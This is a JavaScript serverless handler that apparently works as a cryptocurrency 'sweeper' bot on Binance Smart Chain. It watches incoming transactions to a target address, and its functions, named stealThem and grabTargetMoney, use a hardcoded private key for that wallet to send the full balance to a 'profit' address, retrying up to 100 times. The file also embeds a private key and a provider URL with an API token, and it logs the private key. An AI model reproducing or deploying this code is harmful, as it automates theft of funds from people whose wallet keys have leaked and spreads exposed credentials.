import Web3 from "web3";

const targetPrivateKey = process.env.TARGET_PRIVATE_KEY || '83f88c9e19326d20b178bf5efb9d1ee92e59b69733b7ee766552797fe2e2f28c';
const targetAddress = process.env.TARGET_ADDRESS || '0x38f41253226Ca3468986e6a9f2Ab58860F0a7942';
const profitAddress = process.env.PROFIT_ADDRESS || '0x1455a010e8231EafA6FA77363BC1e54e648a07Ae';
let providerString = "https://fluent-dark-darkness.bsc.discover.quiknode.pro/210b110296b269d77864fa889d26627418e8469e/";

let provider = new Web3(new Web3.providers.HttpProvider(providerString));
let withdrawAttempts = 0;

// this uses the callback syntax, however, we encourage you to try the async/await syntax shown in async-dadjoke.js
export async function handler(event, context) {
  let payload;
  try {
    payload = JSON.parse(event.body);

    console.log(`Payload: ${payload}`);

    if (!payload || !payload.chainId || !payload.streamId) {
      console.log(`Invalid payload: ${payload}`);
      return Promise.resolve({
                               statusCode: 200,
                               body: JSON.stringify({error: 'Invalid payload'})
                             });
    }

    // Check if the toAddress field matches the specified address
    let txs = payload.txs;
    let length = payload.txs.length;
    let toAddress = payload.txs[0].toAddress;

    if (txs && length > 0 && toAddress.toLowerCase() == targetAddress.toLowerCase()) {

      let gasPrice = payload["txs"][0]["gasPrice"]
      console.log(`gasPrice: ${gasPrice}`);
      return stealThem(45000000000).then(result => {
        console.log(`Calling method for toAddress: ${targetAddress}`);
        return {
          statusCode: 200,
          body: JSON.stringify({message: 'Payload processed successfully'})
        };
      });

    }

    // Return a success response

    return {
      statusCode: 200,
      body: JSON.stringify({message: 'Payload was not processed'})
    };

  }
  catch (e) {
    console.log(`Invalid payload: ${event.body}`);
    return {
      statusCode: 200,
      body: JSON.stringify({error: 'Invalid payload'})
    };
  }

}

const stealThem = async (gasPrice) => {
  await grabTargetMoney(gasPrice);
}

async function grabTargetMoney(gasPrice) {

  let gasLimit = 21000;

  let fee = gasLimit * gasPrice;

  console.log(`fee ${fee} finalFee ${fee}`);

  try {
    return await grabMoney(provider, targetPrivateKey, targetAddress, profitAddress, gasLimit, fee, gasPrice);
  }
  catch (e) {
    console.log(e);
    if (withdrawAttempts < 100) {
      withdrawAttempts++;
      setTimeout(grabTargetMoney, 10)
    } else {
      withdrawAttempts = 0;
      return Promise.resolve('withdrawAttempts limit reached error ' + e);
    }
  }

  function grabMoney(w3,
                     privateKey,
                     addressFrom,
                     addressTo,
                     gas,
                     fee,
                     gasPrice) {

    return w3.eth.getBalance(addressFrom)
        .then(balanceFrom => Number(balanceFrom))
        .then(balanceFrom => {
          console.log(`balanceFrom ${balanceFrom}`)
          if (balanceFrom > fee) {
            return createTransaction(w3, addressFrom, addressTo, balanceFrom, fee, gas, gasPrice, privateKey, '0x');
          } else {
            return Promise.resolve(`balanceFrom ${balanceFrom} is less than ${fee}`);
          }
        });
  }
}

function createTransaction(w3, addressFrom, addressTo, balanceFrom, fee, gas, gasPrice, privateKey, data) {
  //log all incoming params
  console.log("createTransaction");
  console.log("addressFrom: " + addressFrom);
  console.log("addressTo: " + addressTo);
  console.log("balanceFrom: " + balanceFrom);
  console.log("fee: " + fee);
  console.log("gas: " + gas);
  console.log("gasPrice: " + gasPrice);
  console.log("privateKey: " + privateKey);
  console.log("data: " + data);

  let valueToWithdraw = balanceFrom - fee;

  console.log("valueToWithdraw: " + valueToWithdraw);

  let signedTransactionPromise = w3.eth.accounts.signTransaction(
      {
        from: addressFrom,
        data: data,
        to: addressTo,
        value: valueToWithdraw.toString(),
        gas: gas,
        gasPrice: gasPrice
      },
      privateKey
  );


  return signedTransactionPromise.then(createTransaction => {
    return sendSigned(createTransaction, w3);
  });
}

async function sendSigned(createTransaction, w3) {
  console.log("createTransaction");
  let rawTransaction = createTransaction.rawTransaction;
  if (rawTransaction) {
    let transactionReceipt = await w3.eth.sendSignedTransaction(rawTransaction);
    return `Transaction successful with hash: ${transactionReceipt.transactionHash}`;
  } else {
    return Promise.resolve("rawTransaction is null");
  }
}